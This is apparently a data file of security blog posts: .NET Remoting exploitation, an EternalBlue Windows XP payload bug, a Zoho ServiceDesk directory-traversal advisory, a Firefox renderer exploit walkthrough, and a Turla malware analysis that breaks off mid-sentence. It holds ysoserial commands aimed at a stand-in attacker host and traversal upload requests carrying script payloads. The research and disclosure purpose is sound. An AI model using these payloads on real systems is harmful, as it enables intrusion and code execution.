would have had much better chances at the later on several occasions."
387b99b5-b823-54d2-acd6-0ec45e7e7fb7,27-January-2022,.NET Remoting Revisited,".NET Remoting is the built-in architecture for remote method invocation in the.NET Framework. It allows invocation of methods across different processes and processes. This blog post gives insights into its features, security measures, and weaknesses.",".NET Remoting is the built-in architecture for remote method invocation in .NET. It is also the origin of the (in-)famous BinaryFormatter and SoapFormatter serializers and not just for that reason a promising target to watch for. This blog post attempts to give insights into its features, security measures, and especially its weaknesses/vulnerabilities that often result in remote code execution. We're also introducing major additions to the ExploitRemotingService tool, a new ObjRef gadget for YSoSerial.Net , and finally a RogueRemotingServer as counterpart to the ObjRef gadget. If you already understand the internal of .NET Remoting, you may skip the introduction and proceed right with Security Features, Pitfalls, and Bypasses . Introduction .NET Remoting is deeply integrated into the .NET Framework and allows invocation of methods across so called remoting boundaries. These can be different app domains within a single process, different processes on the same computer, or different processes on different computers. Supported transports between the client and server are HTTP, IPC (named pipes), and TCP. Here is a simple example for illustration: the server creates and registers a transport server channel and then registers the class as a service with a well-known name at the server's registry: var channel = new TcpServerChannel(12345); ChannelServices.RegisterChannel(channel); RemotingConfiguration.RegisterWellKnownServiceType( typeof(MyRemotingClass), ""MyRemotingClass"" ); Then a client just needs the URL of the registered service to do remoting with the server: var remote = (MyRemotingClass)RemotingServices.Connect( typeof(MyRemotingClass), ""tcp://remoting-server:12345/MyRemotingClass"" ); With this, every invocation of a method or property accessor on remote gets forwarded to the remoting server, executed there, and the result gets returned to the client. This all happens transparently to the developer. And although .NET Remoting has already been deprecated with the release of .NET Framework 3.0 in 2009 and is no longer available on .NET Core and .NET 5+ , it is still around, even in contemporary enterprise level software products. Remoting Internals If you are interested in how .NET Remoting works under the hood, here are some insights. In simple terms: when the client connects to the remoting object provided by the server, it creates a RemotingProxy that implements the specified type MyRemotingClass . All method invocations on remote at the client (except for GetType() and GetHashCode() ) will get sent to the server as remoting calls. When a method gets invoked on remote , the proxy creates a MethodCall object that holds the information of the method and passed parameters. It is then passed to a chain of sinks that prepare the MethodCall and handle the remoting communication with the server over the given transport. On the server side, the received request is also passed to a chain of sinks that reverses the process, which also includes deserialization of the MethodCall object. It ends in a dispatcher sink, which invokes the actual implementation of the method with the passed parameters. The result of the method invocation is then put in a MethodResponse object and gets returned to the client where the client sink chain deserializes the MethodResponse object, extracts the returned object and passes it back to the RemotingProxy . Channel Sinks When the client or server creates a channel (either explicitly or implicitly by connecting to a remote service), it also sets up a chain of sinks for processing outgoing and incoming requests. For the server chain, the first sink is a transport sink, followed by formatter sinks (this is where the BinaryFormatter and SoapFormatter are used), and ending in the dispatch sink. It is also possible to add custom sinks. For the three transports, the server default chains are as follows: HttpServerChannel : HttpServerTransportSink → SdlChannelSink → SoapServerFormatterSink → BinaryServerFormatterSink → DispatchChannelSink IpcServerChannel : IpcServerTransportSink → BinaryServerFormatterSink → SoapServerFormatterSink → DispatchChannelSink TcpServerChannel : TcpServerTransportSink → BinaryServerFormatterSink → SoapServerFormatterSink → DispatchChannelSink On the client side, the sink chain looks similar but in reversed order, so first a formatter sink and finally the transport sink: HttpClientChannel : SoapClientFormatterSink → HttpClientTransportSink IpcClientChannel : BinaryClientFormatterSink → IpcClientTransportSink TcpClientChannel : BinaryClientFormatterSink → TcpClientTransportSink Note that the default client sink chain has a default formatter for each transport (HTTP uses SOAP, IPC and TCP use binary format) while the default server sink chain can process both formats. The default sink chains are only used if the channel was not created with an explicit IClientChannelSinkProvider and/or IServerChannelSinkProvider . Passing Parameters and Return Values Parameter values and return values can be transfered in two ways: by value: if either the type is serializable (cf. Type.IsSerializable ) or if there is a serialization surrogate for the type (see following paragraphs) by reference: if type extends MarshalByRefObject (cf. Type.IsMarshalByRef ) In case of the latter, the objects need to get marshaled using one of the RemotingServices.Marshal methods. They register the object at the server's registry and return a ObjRef instance that holds the URL and type information of the marshaled object. The marshaling happens automatically during serialization by the serialization surrogate class RemotingSurrogate that is used for the BinaryFormatter / SoapFormatter in .NET Remoting (see CoreChannel.CreateBinaryFormatter(bool, bool) and CoreChannel.CreateSoapFormatter(bool, bool) ). A serialization surrogate allows to customize serialization/deserialization of specified types. In case of objects extending MarshalByRefObject , the RemotingSurrogateSelector returns a RemotingSurrogate (see RemotingSurrogate.GetSurrogate(Type, StreamingContext, out ISurrogateSelector) ). It then calls the RemotingSurrogate.GetObjectData(Object, SerializationInfo, StreamingContext) method, which calls the RemotingServices.GetObjectData(object, SerializationInfo, StreamingContext) , which then calls RemotingServices.MarshalInternal(MarshalByRefObject, string, Type) . That basically means, every remoting object extending MarshalByRefObject is substituted with a ObjRef and thus passed by reference instead of by value. On the receiving side, if an ObjRef gets deserialized by the BinaryFormatter / SoapFormatter , the IObjectReference.GetRealObject(StreamingContext) implementation of ObjRef gets called eventually. That interface method is used to replace an object during deserialization with the object returned by that method. In case of ObjRef , the method results in a call to RemotingServices.Unmarshal(ObjRef, bool) , which creates a RemotingProxy of the type and target URL specified in the deserialized ObjRef . That means, in .NET Remoting all objects extending MarshalByRefObject are passed by reference using an ObjRef . And deserializing an ObjRef with a BinaryFormatter / SoapFormatter (not just limited to .NET Remoting) results in the creation of a RemotingProxy . With this knowledge in mind, it should be easier to follow the rest of this post. Previous Work Most of the issues of .NET Remoting and the runtime serializers BinaryFormatter / SoapFormatter have already been identified by James Forshaw : Are you my Type? – Breaking .NET Through Serialization (Aug 2012) Stupid is as Stupid Does When It Comes to .NET Remoting (Nov 2014) Bypassing Low Type Filter in .NET Remoting (Oct 2019) We highly encourage you to take the time to read the papers/posts. They are also the foundation of the ExploitRemotingService tool that will be detailed in ExploitRemotingService Explained further down in this post. Security Features, Pitfalls, and Bypasses The .NET Remoting is fairly configurable. The following security aspects are built-in and can be configured using special channel and formatter properties : HTTP Channel IPC Channel TCP Channel Authentication n/a n/a secure = bool channel property ISecurableChannel.IsSecured (via NegotiateStream ; default: false ) Authorization n/a authorizationGroups = Windows/AD Group channel property (default: thread owner is allowed, NT Authority\Network group ( SID S-1-5-2) is denied) CommonSecurityDescriptor passed to a IpcServerChannel constructor custom IAuthorizeRemotingConnection class authorizationModule channel property passed to TcpServerChannel constructor Impersonation n/a impersonate = bool (default: false ) impersonate = bool (default: false ) Conf. , Int. , Auth. Protection n/a n/a protectionLevel ={ None , Sign , EncryptAndSign } channel property Interface Binding n/a n/a rejectRemoteRequests = bool (loopback only, default: false ), bindTo = address (specific IP address, default: n/a) Pitfalls and important notes on these security features: HTTP Channel No security features provided; ought to be implemented in IIS or by custom server sinks. IPC Channel By default, access to named pipes created by the IPC server channel are denied to NT Authority\Network group ( SID S-1-5-2), i. e., they are only accessible from the same machine. However, by using authorizationGroup , the network restriction is not in place so that the group that is allowed to access the named pipe may also do it remotely (not supported by the default IpcClientTransportSink , though). TCP Channel With a secure TCP channel, authentication is required. However, if no custom IAuthorizeRemotingConnection is configured for authorization, it is possible to logon with any valid Windows account, including NT Authority\Anonymous Logon ( SID S-1-5-7). ExploitRemotingService Explained James Forshaw also released ExploitRemotingService , which contains a tool for attacking .NET Remoting services via IPC/TCP by the various attack techniques. We'll try to explain them here. There are basically two attack modes: raw Exploit BinaryFormatter / SoapFormatter deserialization (see also YSoSerial.Net ) all others commands (see -h ) Write a FakeAsm assembly to the server's file system, load a type from it to register it at the server to be accessible via the existing .NET Remoting channel. It is then accessible via .NET Remoting and can perform various commands. To see the real beauty of his sorcery and craftsmanship, we'll try to explain the different operating options for the FakeAsm exploitation and their effects: without options Send a FakeMessage that extends MarshalByRefObject and thus is a reference ( ObjRef ) to an object on the attacker's server. On deserialization, the victim's server creates a proxy that transparently forwards all method invocations to the attacker's server. By exploiting a TOCTOU flaw, the get_MethodBase() property method of the sent message ( FakeMessage ) can be adjusted so that even static methods can be called. This allows to call File.WriteAllBytes(string, byte[]) on the victim's machine. --useser Send a forged Hashtable with a custom IEqualityComparer by reference that implements GetHashCode(object) , which gets called by the victim server on the attacker's server remotely. As for the key, a FileInfo / DirectoryInfo object is wrapped in SerializationWrapper that ensures the attacker's object gets marshaled by value instead of by reference. However, on the remote call of GetHashCode(object) , the victim's server sends the FileInfo / DirectoryInfo by reference so that the attacker has a reference to the FileInfo / DirectoryInfo object on the victim. --uselease Call MarshalByRefObject.InitializeLifetimeService() on a published object to get an ILease instance. Then call Register(ISponsor) with an MarshalByRefObject object as parameter to make the server call the IConvertible.ToType(Type, IformatProvider) on an object of the attacker's server, which then can deliver the deserialization payload. Now the problem with the --uselease option is that the remote class needs to return an actual ILease object and not null . This may happen if the virtual MarshalByRefObject.InitializeLifetimeService() method is overriden. But the main principle of sending an ObjRef referencing an object on the attacker's server can be generalized with any method accepting a parameter. That is why we have added the --useobjref to ExploitRemotingService (see also Community Contributions further below): --useobjref Call the MarshalByRefObject.GetObjRef(Type) method with an ObjRef as parameter value. Similarly to --uselease , the server calls IConvertible.ToType(Type, IformatProvider) on the proxy, which sends a remoting call to the attacker's server. Security Measures and Troubleshooting If no custom errors are enabled and a RemotingException gets returned by the server, the following may help to identify the cause and to find a solution: Error Reason ExampleRemotingService Options ExploitRemotingService Bypass Options ""Requested Service not found"" The URI of an existing remoting service must be known; there is no way to iterate them. n/a --nulluri may work if remoting service has not been servicing any requests yet. NotSupportedException with link to KB 390633 Disallow received IMessage being MarshalByRefObject (see AppSettings.AllowTransparentProxyMessage ) -d --uselease , --useobjref SecurityException with PermissionSet info Code Access Security (CAS) restricted permissions in place ( TypeFilterLevel.Low ) -t low --uselease , --useobjref Community Contributions Our research on .NET Remoting led to some new insights and discoveries that we want to share with the community. Together with this blog post, we have prepared the following contributions and new releases. ExploitRemotingService The ExploitRemotingService is already a magnificent tool for exploiting .NET Remoting services. However, we have made some additions to ExploitRemotingService that we think are worthwhile: --useobjref option This newly added option allows to use the ObjRef trick described --remname option Assemblies can only be loaded by name once. If that loading fails, the runtime remembers that and avoids trying to load it again. That means, writing the FakeAsm.dll to the target server's file system and loading a type from that assembly must succeed on the first attempt. The problem here is to find the proper location to write the assembly to where it will be searched by the runtime ( ExploitRemotingService provides the options --autodir and --installdir=… to specify the location to write the DLL to). We have modified ExploitRemotingService to use the --remname to name the FakeAsm assembly so that it is possible to have multiple attempts of writing the assembly file to an appropriate location. --ipcserver option As IPC server channels may be accessible remotely, the --ipcserver option allows to specify the server's name for a remote connection. YSoSerial.Net The new ObjRef gadget is basically the equivalent of the sun.rmi.server.UnicastRef class used by the JRMPClient gadget in ysoserial for Java : on deserialization via BinaryFormatter / SoapFormatter , the ObjRef gets transformed to a RemotingProxy and method invocations on that object result in the attempt to send an outgoing remote method call to a specified target .NET Remoting endpoint. This can then be used with the RogueRemotingServer described below. RogueRemotingServer The newly released RogueRemotingServer is the counterpart of the ObjRef gadget for YSoSerial.Net. It is the equivalent to the JRMPListener server in ysoserial for Java and allows to start a rogue remoting server that delivers a raw BinaryFormatter / SoapFormatter payload via HTTP/IPC/TCP. Example of ObjRef Gadget and RogueRemotingServer Here is an example of how these tools can be used together: # generate a SOAP payload for popping MSPaint ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -o raw -c MSPaint.exe > MSPaint.soap # start server to deliver the payload on all interfaces RogueRemotingServer.exe --wrapSoapPayload http://0.0.0.0/index.html MSPaint.soap # test the ObjRef gadget with the target http://attacker/index.html ysoserial.exe -f BinaryFormatter -g ObjRef -o raw -c http://attacker/index.html -t During deserialization of the ObjRef gadget, an outgoing .NET Remoting method call request gets sent to the RogueRemotingServer , which replies with the TextFormattingRunProperties gadget payload. Conclusion .NET Remoting has already been deprecated long time ago for obvious reasons. If you are a developer, don't use it and migrate from .NET Remoting to WCF . If you have detected a .NET Remoting service and want to exploit it, we'll recommend the excellent ExploitRemotingService by James Forshaw that works with IPC and TCP (for HTTP, have a look at Finding and Exploiting .NET Remoting over HTTP using Deserialisation by Soroush Dalili ). If that doesn't succeed, you may want to try it with the enhancements added to our fork of ExploitRemotingService , especially the --useobjref technique and/or naming the FakeAsm assembly via --remname might help. And even if none of these work, you may still be able to invoke arbitrary methods on the exposed objects and take advantage of that."
08925894-6ae8-5e8f-8afb-3a136998b217,24-November-2018,Dissecting a Bug in the EternalBlue Client for Windows XP (FuzzBunch),EternalBlue exploit for Windows XP is not working in the wild. Differences in NT/HAL causes the payload to abort prematurely on single-core installs. FuzzBunch includes a different version of the exploit chain for XP that works in the lab.,"See Also: Dissecting a Bug in the EternalRomance Client (FuzzBunch) Background Multiple Exploit Chains Payload Methodology Single Core Branch Anomaly Root Cause Analysis NT Red Herring HAL Variation Byte Table Conclusion Background Pwning Windows 7 was no problem, but I would re-visit the EternalBlue exploit against Windows XP for a time and it never seemed to work. I tried all levels of patching and service packs, but the exploit would either always passively fail to work or blue-screen the machine. I moved on from it, because there was so much more of FuzzBunch that was unexplored. Well, one day on a pentest a wild Windows XP appeared, and I figured I would give FuzzBunch a go. To my surprise, it worked! And on the first try. Why did this exploit work in the wild but not against runs in my ""lab""? tl;dr: Differences in NT/HAL between single-core/multi-core/PAE CPU installs causes FuzzBunch's XP payload to abort prematurely on single-core installs. Multiple Exploit Chains Keep in mind that there are several versions of EternalBlue. The Windows 7 kernel exploit has been well documented. There are also ports to Windows 10 which have been documented by myself and JennaMagius as well as sleepya_ . But FuzzBunch includes a completely different exploit chain for Windows XP , which cannot use the same basic primitives (i.e. SMB2 and SrvNet.sys do not exist yet!). I discussed this version in depth at DerbyCon 8.0 ( slides / video ). tl;dw: The boot processor KPCR is static on Windows XP, and to gain shellcode execution the value of KPRCB . PROCESSOR_POWER_STATE .IdleFunction is overwritten. Payload Methodology As it turns out, the exploit was working just fine in the lab. What was failing was FuzzBunch's payload. The main stages of the ring 0 shellcode performs the following actions: Obtains &nt and &hal using the now-defunct KdVersionBlock trick Resolves some necessary function pointers, such as hal!HalInitializeProcessor Restores the boot processor KPCR/KPRCB which was corrupted during exploitation Runs DoublePulsar to backdoor the SMB service Gracefully resumes execution at a normal state (nt!PopProcessorIdle) Single Core Branch Anomaly Setting a couple hardware breakpoints on the IdleFunction switch and +0x170 into the shellcode (after a couple initial XOR/Base64 shellcode decoder stages), it is observed that a multi-core machine install branches differently than the single-core machine. kd> ba w 1 ffdffc50 ""ba e 1 poi(ffdffc50)+0x170;g;"" The multi-core machine has acquired a function pointer to hal!HalInitializeProcessor. Presumably, this function will be called to clean up the semi-corrupted KPRCB. The single-core machine did not find hal!HalInitializeProcessor... sub_547 instead returned NULL. The payload cannot continue, and will now self destruct by zeroing as much of itself out as it can and set up a ROP chain to free some memory and resume execution. Note: A successful shellcode execution will perform this action as well, just after installing DoublePulsar first. Root Cause Analysis The shellcode function sub_547 does not properly find hal!HalInitializeProcessor on single core CPU installs, and thus the entire payload is forced to abruptly abort. We will need to reverse engineer the shellcode function to figure out exactly why the payload is failing. There is an issue in the kernel shellcode that does not take into account all of the different types of the NT kernel executables are available for Windows XP. Specifically, the multi-core processor version of NT works fine (i.e. ntkrnlamp.exe), but a single core install (i.e. ntoskrnl.exe) will fail. Likewise, there is a similar difference in halmacpi.dll vs halacpi.dll. The NT Red Herring The first operation that sub_547 performs is to obtain HAL function imports used by the NT executive. It finds HAL functions by first reading at offset 0x1040 into NT. On multi-core installs of Windows XP, this offset works as intended, and the shellcode finds hal!HalQueryRealTimeClock: However, on single-core installations this is not a HAL import table, but instead a string table: At first I figured this was probably the root cause. But it is a red herring, as there is correction code. The shellcode will check if the value at 0x1040 is an address in the range within HAL. If not it will subtract 0xc40 and start searching in increments of 0x40 for an address within the HAL range, until it reaches 0x1040 again. Eventually, the single-core version will find a HAL function, this time hal!HalCalibratePerformanceCounter: This all checks out and is fine, and shows that Equation Group did a good job here for determining different types of XP NT. HAL Variation Byte Table Now that a function within HAL has been found, the shellcode will attempt to locate hal!HalInitializeProcessor. It does so by carrying around a table (at shellcode offset 0x5e7) that contains a 1-byte length field followed by an expected sequence of bytes. The original discovered HAL function address is incremented in search of those bytes within the first 0x20 bytes of a new function. The desired 5 bytes are easily found in the multi-core version of HAL: However, the function on single-core HAL is much different. There is a similar mov instruction, but it is not a movzx . The byte sequence being searched for is not present in this function, and consequently the function is not discovered. Conclusion It is well known (from many flame wars on Windows kernel development mailing lists) that searching for byte sequences to identify functions is unreliable across different versions and service packs of Windows. We have learned from this bug that exploit developers must also be careful to account for differences in single/multi-core and PAE variations of NTOSKRNL and HAL. In this case, the compiler decided to change one movzx instruction to a mov instruction and broke the entire payload. It is very curious that the KdVersionBlock trick and a byte sequence search is used to find functions in this payload. The Windows 7 payload finds NT and its exports in, as seen, a more reliable way, by searching backwards in memory from the KPCR IDT and then parsing PE headers. This HAL function can be found through such other means (it appears readily exported by HAL). The corrupted KPCR can also be cleaned up in other ways. But those are both exercises for the reader. There is circumstantial evidence that primary FuzzBunch development was started in late 2001. The payload seems maybe it was only written for and tested against multi-core processors? Perhaps this could be a indicator as to how recent the XP exploit was first written. Windows XP was broadly released on October 25, 2001. While this is the same year that IBM invented the first dual-core processor (POWER4), Intel and AMD would not have a similar offering until 2004 and 2005, respectively. This is yet another example of the evolution of these ETERNAL exploits. The Equation Group could have re-used the same exploit and payload primitives, yet chose to develop them using many different methodologies, perhaps so if one methodology was burned they could continue to reap the benefits of their exploit diversification. There is much esoteric Windows kernel internals knowledge that can be learned from studying these exploits."
e11b7585-4701-510d-a803-427ac9af70df,18-February-2019,Directory Traversal Vulnerability Found in Zoho ManageEngine Service Desk Plus 9.4,Vulnerability exists in Zoho ManageEngine Service Desk Plus 9.4. It allows a user to upload a file to a directory that is writable by the application. This can be used to serve malware or perform social engineering attacks.,"Multiple directory traversal vulnerability exists in Zoho ManageEngine Service Desk Plus 9.4 which allows a user with at least guest access to upload a file which can be placed into a directory that is writable by the applicaiton. This includes directories that are served from the web server. An attacker can make use of this to serve malware from the domain hosting the ServiceDesk application or to perform convincing social engineering attacks by (for example) uploading an HTML file that requests a user to log in to the application. As this page will be served from the ServiceDesk domain, it will look like a valid page of the application. The following HTTP request shows using directory traversal in the “module” parameter to change the path the “testfile.html” file is uploaded to. This places the uploaded file in webapps/ROOT/ directory. Directory Traversal in FileAttachment.jsp POST /common/FileAttachment.jsp HTTP / 1.1 Host : example.com User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language : en-US,en;q=0.5 Accept-Encoding : gzip, deflate Referer : http://example.com/AddNewProblem.cc Content-Type : multipart/form-data; boundary=---------------------------28363178828984 Content-Length : 640 Cookie : JSESSIONID=54E0AABA3F31B6868B13E0F0E3CC775E; JSESSIONIDSSO=E79BD1E50040898CFFE31F5FA592F9DE; sdpcsrfcookie=793aa7b9-0a12-4800-b674-1f912b584d9b; servicedeskplus-_zldp=LsfUh%2FKeku%2BdsWZxSHjiX51nFQy4GpySE4FylFB4M7br5Z1XvvLoEZmwHtjfPqKs; servicedeskplus-_zldt=7567fa5e-55e1-4cff-a800-c96f8ccad8fb Connection : close Upgrade-Insecure-Requests : 1 -----------------------------28363178828984 Content-Disposition: form-data; name=""modId"" null -----------------------------28363178828984 Content-Disposition: form-data; name=""module"" ../../webapps/ROOT/ -----------------------------28363178828984 Content-Disposition: form-data; name=""filePath""; filename=""testfile.html"" Content-Type: text/html <script>alert(1)</script> -----------------------------28363178828984 Content-Disposition: form-data; name=""att_desc"" -----------------------------28363178828984 Content-Disposition: form-data; name=""attach"" Attach file -----------------------------28363178828984-- Directory Traversal in ResourcesAttachments.jsp POST /asset/ResourcesAttachments.jsp HTTP / 1.1 Host : example.com User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language : en-US,en;q=0.5 Accept-Encoding : gzip, deflate Referer : http://example.com/asset/ResourcesAttachments.jsp Content-Type : multipart/form-data; boundary=---------------------------6692327381577 Content-Length : 829 Cookie : JSESSIONID=6C91A33EB54282BCEAFBEBBF1FB1AA54; sdpcsrfcookie=793aa7b9-0a12-4800-b674-1f912b584d9b; servicedeskplus-_zldp=LsfUh%2FKeku%2BdsWZxSHjiX51nFQy4GpySE4FylFB4M7br5Z1XvvLoEZmwHtjfPqKs; servicedeskplus-_zldt=7567fa5e-55e1-4cff-a800-c96f8ccad8fb; JSESSIONIDSSO=CCB0AE7CCF9B8208245AC5DB0E8EC06E Connection : close Upgrade-Insecure-Requests : 1 -----------------------------6692327381577 Content-Disposition: form-data; name=""TYPE"" null -----------------------------6692327381577 Content-Disposition: form-data; name=""wsID"" null -----------------------------6692327381577 Content-Disposition: form-data; name=""module"" ../../webapps/ROOT/ -----------------------------6692327381577 Content-Disposition: form-data; name=""pageName"" null -----------------------------6692327381577 Content-Disposition: form-data; name=""filePath""; filename=""test123.html"" Content-Type: text/html <script>alert(1)<script> -----------------------------6692327381577 Content-Disposition: form-data; name=""att_desc"" -----------------------------6692327381577 Content-Disposition: form-data; name=""attach"" Attach file -----------------------------6692327381577-- Disclosure Timeline 2018-07-02 : Vulnerability raised to vendor using their bug reporting platform 2018-07-03 : Response from vendor acknowledging receipt of vulnerability 2018-08-20 : Contact vendor requesting update 2018-08-20 : Fix released for FileAttachment.jsp in release 9415 2018-08-21 : Contact vendor requesting update for ResourcesAttachments.jsp vulnerability 2019-01-17 : Fix released for ResourcesAttachments.jsp in release 10009"
21c1e3b8-953a-5daf-85ef-113bf72ab2a9,18-August-2022,But You Told Me You Were Safe: Attacking the Mozilla Firefox Renderer (Part 1),Manfred Paul compromised the Mozilla Firefox browser using a full chain exploit. The exploit was based on a vulnerability in the await implementation of JavaScript's top level await function. The vulnerability was used to compromise the Firefox renderer process.,"Vulnerabilities and exploits in common targets like browsers are often associated with memory safety issues. Typically this involves either a direct error in memory management or a way to corrupt internal object state in the JavaScript engine. One way to eliminate such memory safety issues is to use a memory-safe language such as Rust or even JavaScript itself. At Pwn2Own Vancouver 2022, Manfred Paul compromised the Mozilla Firefox browser using a full chain exploit that broke the mold. Although his exploit used some memory corruptions, the vulnerable code was written in a memory-safe programming language: JavaScript! In fact, both vulnerabilities used in the chain were related to one rather notorious language aspect of JavaScript – prototypes. In this blog, we will look at the first vulnerability in the chain, which was used to compromise the Mozilla Firefox renderer process. This vulnerability, known as CVE-2022-1802, is a prototype pollution vulnerability in the await implementation. You can find more information about this vulnerability on the Zero Day Initiative advisory page tracked as ZDI-22-799 . Mozilla fixed this vulnerability in Firefox 100.0.2 via Mozilla Foundation Security Advisory 2022-19 . Note: this blog series is heavily reliant on the details provided by Manfred Paul at the Pwn2Own competition. Compromising The Renderer Process Modern JavaScript features the module syntax , which allows developers to split code into individual files. An even newer feature is the support of asynchronous modules, or, more precisely, the feature known as top level await . In Firefox’s JavaScript engine, SpiderMonkey, large parts of this feature are implemented using built-in JavaScript code. Consider the following function from the SpiderMonkey codebase, in /js/src/builtin/Module.js : There are three facts we must note the code shown above: 1 -- This function runs in the same JavaScript context as the user’s code. This is true for most JavaScript-based functions in Firefox. This means that global state, including prototypes of global objects, is shared between this built-in code and untrusted website code. 2 -- The function has a default argument of execList = [] . In practice, the function is called without specifying this argument (except for the recursive call in the function itself). Therefore, a new empty array object is constructed and used for this argument. Like any other ordinary array, this array object has the unique object Array.prototype as its prototype. 3 -- The function invokes std_Array_push on this array object. The std_Array_push function leads to a call to the Array.prototype.push JavaScript method. While the usage of std_Array_push function instead of Array.prototype.push helps prevent side effects up to a certain point, the function still can interact with the object’s prototype. (Note that in various other places within this same built-in JavaScript file /js/src/builtin/Module.js , a different function is used to assign array values: DefineDataProperty . In contrast to std_Array_push , DefineDataProperty is safe and will not interact in any way with the object’s prototype.) The semantics of Array.prototype.push with a single argument are very roughly equivalent to the following: Notably, the assignment is not just the definition of a data property on the object itself. Instead, it searches the object’s prototype chain for existing properties as per usual JavaScript semantics. If the imported module defines a getter/setter for property 0 on the Array prototype ( Array.prototype ), this assignment operation will trigger the setter function. This call technically violates the ECMAScript specification that defines GatherAsyncParentCompletions in terms of abstract lists and not actual JavaScript arrays. Crucially, this has yet another effect: it leaks the value that is assigned to our setter, so we recover the value “m” representing a module! This object is not the same as the module namespace returned by import() , but rather, it is an internal type of the JavaScript engine not meant to be accessible to untrusted script. It exposes some unsafe methods via its prototype, such as GatherAsyncParentCompletions . Calling GatherAsyncParentCompletions results in a call to the UnsafeSetReservedSlot method, which can be used to achieve memory corruption if we pass in a non-module object. Triggering The Vulnerability It is easy to trigger the vulnerability and obtain a Module object: As described, we simply need to attach a setter to the 0 property of Array.prototype and wait for it to be called. Note that this snippet will only work when imported as a module from another file. The last line exists solely to mark the module as asynchronous, which is needed to trigger the bug. Achieving Memory Corruption To achieve memory corruption, we can now call mod.gatherAsyncParentCompletions with an object of the form {asyncParentModules:[obj]} , resulting in a call to UnsafeSetReservedSlot . This will attempt to write the value obj.pendingAsyncDependencies-1 to the internal object slot with number MODULE_OBJECT_PENDING_ASYNC_DEPENDENCIES_SLOT=20 . In SpiderMonkey, objects have space for up to 16 so-called fixed slots which are for internal use only. This number is defined by the MAX_FIXED_SLOTS constant. Slots with a higher index are indexed from an array pointed to by the slots_ field. This means our write will be directed to the array pointed to by slots_ . No bounds checking exists to make sure that the slots_ array is large enough to accommodate the specified index, because the UnsafeSetReservedSlot function assumes, as the name implies, that the caller will pass only suitable objects. The general idea now is to: 1 -- Create a new array object. 2 -- Set some named properties of the object to force the allocation of a slots_ array for the object. Among these properties, we should create one with the name pendingAsyncDependencies . 3 -- Write to a few numbered elements of the object to ensure the allocation of elements_ (the backing store for array elements). By getting the alignment right, slots_[4] will then point to the capacity value of elements_ , which we can then overwrite. This is not trivial. Fortunately, the heap allocator is very simple and deterministic. All of the allocations so far will take place in the nursery heap, which is a special area for small short-lived objects. Memory in that area will be allocated by a simple bump allocator. After increasing the capacity, we can write out-of-bounds of the object’s elements_ array and corrupt other nearby objects. From here, arbitrary read and write primitives are easily constructed by overwriting the data pointer of a typed array. Note that corruption in objects in the nursery heap cannot be used for very long since the objects created there will be soon moved to the tenured heap. The best way to proceed is to use corruption in the nursery heap as a first stage only, and immediately use it to produce corruption in the tenured heap. For example, this can be done by corrupting ArrayBuffer objects. Executing Shellcode Firefox uses W^X JIT , which means all JIT-produced executable pages are non-writable. This prevents us from overwriting executable JIT code with our shellcode. There is an already well-known method to force JIT to emit arbitrary ROP gadgets by embedding chosen floating-point constants into a JIT-compiled JavaScript function. This results in the appearance of arbitrary short byte sequences in an executable page. Manfred Paul further enhanced this technique. Now it does not even need ROP at all! Instead of using a JavaScript function, the floating-point constants are embedded into a WebAssembly method, so they are compiled into consecutive memory in order of appearance. This makes it possible to insert not just ROP gadgets, but even somewhat longer stretches of shellcode by encoding them in the floating-point constants. There are still some restrictions, though: no 8-byte block may appear twice, or the constant will only be emitted once. Also, due to ambiguity in representation, byte sequences that are equal to NaN might not be encoded correctly. Therefore, Manfred Paul opted for a minimal first-stage shellcode that offers just the following two pieces of functionality: 1 -- The ability to read a pointer from the Windows PEB structure. 2 -- The ability to invoke a function given the function’s address. The attacker, from ordinary JavaScript, triggers execution of the shellcode’s first function to leak a value from the PEB. Next, the JavaScript uses this value together with the arbitrary read primitive to locate kernel32.dll and its functions in memory. Once it has located the address for VirtualProtect , it invokes the shellcode’s second function to mark the backing store of an ArrayBuffer object as executable, making it possible to run a second-stage shellcode without constraints and compromise the renderer process. Now that we have code execution inside the renderer, it is time to prepare to attack the sandbox. This will be covered in the second blog, coming next week. Final Notes For a long time, developers have tried to fight memory corruption vulnerabilities by introducing various mitigations, and they have succeeded in making it more difficult for attackers to fully compromise applications. However, attackers have also come up with their own creative methods to bypass mitigations. Using a memory-safe programming language is a critical move. If the introduction of memory corruption vulnerabilities can be avoided in the first place, it would not be necessary to rely upon the strength of mitigations. This post looked at a great vulnerability demonstrating that even if you replace existing code with JavaScript, you could still be prone to memory corruption. Stay tuned to this blog for part two of this series coming next week. Until then, you can find me on Twitter at @hosselot and follow the team on Twitter or Instagram for the latest in exploit techniques and security patches."
3824e8bd-998c-505c-94a6-848e184de420,14-July,Turla / Venomous Bear updates its arsenal: “NewPass” appears on the APT threat scene,Telsy has observed artifacts related to an attack in June 2020. The group suspects the implant was used to target diplomats and foreign affairs in the EU. The malware is likely linked to the popular Russian APT known as Venomous Bear.,"Recently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked to the popular Russian Advanced Persistent Threat ( APT ) known as Venomous Bear (aka Turla or Uroburos ). At the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally named “ NewPass “ as one of the parameters used to send exfiltrated data to the command and control. Telsy suspects this implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs. NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other. There are at least three components of the malware: a dropper, that deploys the binary file; a loader library, that is able to decode the binary file extracting the last component, responsible for performing specific operations, such as communicate with the attackers’ command and control server (the “agent”) The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries’ values. The first Windows library has a huge size, about 2.6 MB , and it is identified by the following hash: Exploring the artifact using a static approach, it is possible to note that it exports a high number of functions, as shown in the following image. Most of the reported functions point to useless code and only LocalDataVer can be used as an entry point of the DLL, therefore making it useful to understand the malicious behavior. Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities, using “ DllMain ” or “ DllRegisterServer ” as an entrypoint function. In this case, both these functions cause the termination of the program, without showing the real malware behavior. The library’s aim is to deploy the backdoor and its configuration file under two different folders depending on attacker’s customization. According to what has been observed by our research team, the paths used in this case are the following: For the second sample we 